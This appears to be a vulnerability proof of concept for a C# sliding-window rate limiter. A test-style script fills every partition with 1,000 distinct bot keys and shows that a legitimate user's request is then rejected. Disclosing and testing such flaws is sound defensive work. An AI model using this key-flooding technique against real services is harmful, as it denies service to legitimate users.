# ATTACK PROOF-OF-CONCEPT: NOISY-NEIGHBOR PARTITION SATURATION (DOS-01)

**Vulnerability:** Partition Saturation Rejection  
**Severity:** HIGH  

---

## 1. Attack Script
```csharp
var limiter = new SlidingWindowRateLimiter(new() { PermitLimit = 100, MaxPartitions = 1000 });

// 1. Attacker generates 1,000 distinct requests in 1 second
for (int i = 0; i < 1000; i++)
{
    var res = await limiter.AcquireAsync($"bot-{i}", 1);
    Assert.True(res.Value.IsAcquired);
}

// 2. Legitimate user requests a permit with key "user-legitimate"
// Partition count is at MaxPartitions (1000). None are idle yet (window just started).
var legLease = await limiter.AcquireAsync("user-legitimate", 1);

// OBSERVED RESULT:
Assert.False(legLease.Value.IsAcquired); // REJECTED! Denial of service achieved.
```
